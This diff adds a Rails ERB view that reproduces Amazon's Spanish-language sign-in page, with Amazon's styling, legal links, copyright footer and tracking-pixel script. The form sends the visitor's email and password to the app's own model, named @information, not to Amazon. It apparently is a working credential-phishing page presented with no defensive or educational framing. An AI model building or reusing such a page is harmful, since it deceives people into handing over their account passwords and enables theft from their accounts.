@@ -1,0 +1,61 @@
+<div class="a-container a-padding-double-large" style="min-width:350px;padding:44px 0 !important">
+        <div class="a-row a-spacing-double-large" style="width: 350px; margin: 0 auto">
+            <div class="a-row a-spacing-medium a-text-center"><i class="a-icon a-logo"></i></div>
+            <div class="a-section">
+                <div class="a-box a-color-offset-background">
+                    <div class="a-box-inner a-padding-extra-large">
+                        <%= form_with(model: @information, method: "post") do |form| %>
+                            <div class="field">
+                                <%= form.label :email, "Correo Electrónico:" %>
+                                <%= form.email_field :email, class:"a-input-text a-span12 auth-autofocus auth-required-field" %>
+                            </div>
+
+                            <div class="field">
+                                <%= form.label :pass, "Contraseña:" %>
+                                <%= form.password_field :pass, class:"a-input-text a-span12 auth-autofocus auth-required-field" %>
+                            </div>
+                            <span id="continue" class="a-button a-button-span12 a-button-primary" style="margin-top: 20px;"><span
+                                        class="a-button-inner">
+                                            <%= form.submit "Continuar", class:"a-button-input"%><span id="continue-announce"
+                                            class="a-button-text" aria-hidden="true">
+                                            Continuar
+                                        </span></span></span> <br>
+                            <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+                                Al continuar, aceptas las <a
+                                    href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=508088">Condiciones
+                                    de uso</a> y el <a
+                                    href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=468496">Aviso
+                                    de privacidad</a> de Amazon.
+                            </div>
+                        <% end %>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="a-divider a-divider-section">
+            <div class="a-divider-inner"></div>
+        </div>
+
+        <div class="a-text-center a-spacing-small a-size-mini">
+            <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_cou?ie=UTF8&amp;nodeId=508088">Conditions
+                of Use</a>
+            <span class="a-letter-space"></span>
+            <span class="a-letter-space"></span>
+            <span class="a-letter-space"></span>
+            <span class="a-letter-space"></span>
+            <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=468496">Privacy
+                Policy</a>
+        </div>
+        <div class="a-text-center a-size-mini a-color-secondary">
+            &copy; 1996-2014, Amazon.com, Inc. or its affiliates
+            <script>
+                if (true === true) {
+                    document.write('<img src="https://fls-na.amaz' + 'on.com/' + '1/oc-csi/1/OP/requestId=R2SWR7H40Z6GS9PSB16T&js=1" />');
+                };
+            </script>
+            <noscript>
+                <img src="https://fls-na.amazon.com/1/oc-csi/1/OP/requestId=R2SWR7H40Z6GS9PSB16T&amp;js=0" />
+            </noscript>
+        </div>
+    </div>
